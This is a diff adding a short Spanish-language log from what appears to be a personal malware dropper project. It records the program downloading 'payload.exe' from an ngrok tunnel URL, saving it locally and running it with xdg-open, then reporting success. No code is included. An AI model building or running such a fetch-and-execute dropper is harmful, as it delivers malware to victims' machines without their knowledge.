@@ -1,0 +1,6 @@
+2024-09-04 19:34:40,991 - INFO - Descargando archivo desde https://hornet-alive-muskox.ngrok-free.app/payload/payload.exe
+2024-09-04 19:35:50,646 - INFO - Archivo descargado y guardado como /home/eliashiguera/Escritorio/Malwares/Dropper/src/../payload/payload.exe
+2024-09-04 19:35:50,656 - INFO - Ejecutando el payload desde /home/eliashiguera/Escritorio/Malwares/Dropper/src/../payload/payload.exe
+2024-09-04 19:35:50,663 - INFO - Ejecutando comando: xdg-open /home/eliashiguera/Escritorio/Malwares/Dropper/src/../payload/payload.exe
+2024-09-04 19:36:29,700 - INFO - Comando ejecutado exitosamente. Salida: 
+2024-09-04 19:36:29,703 - INFO - Payload ejecutado exitosamente
